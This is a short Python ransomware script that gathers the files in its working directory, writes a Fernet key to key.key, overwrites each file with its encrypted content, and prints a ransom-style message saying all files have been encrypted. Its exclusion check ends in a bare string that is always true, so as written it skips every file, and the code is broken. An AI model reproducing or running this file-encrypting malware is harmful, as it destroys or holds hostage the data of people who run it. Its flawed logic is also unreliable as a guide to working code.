import os
from cryptography.fernet import Fernet # type: ignore

allfiles = []
for file in os.listdir():
    if file == "ransomware.py" or file == "key.key" or "decr.py":
        continue
    if os.path.isfile(file):
        allfiles.append(file)

print(allfiles)

key = Fernet.generate_key()
with open("key.key", "wb") as thekey:
    thekey.write(key)

for file in allfiles:
    with open(file, "rb") as thefile:
        content = thefile.read()
    content_enc = Fernet(key).encrypt(content)
    with open(file, "wb") as thefile:
        thefile.write(content_enc)

print("All your files has been encrypted")
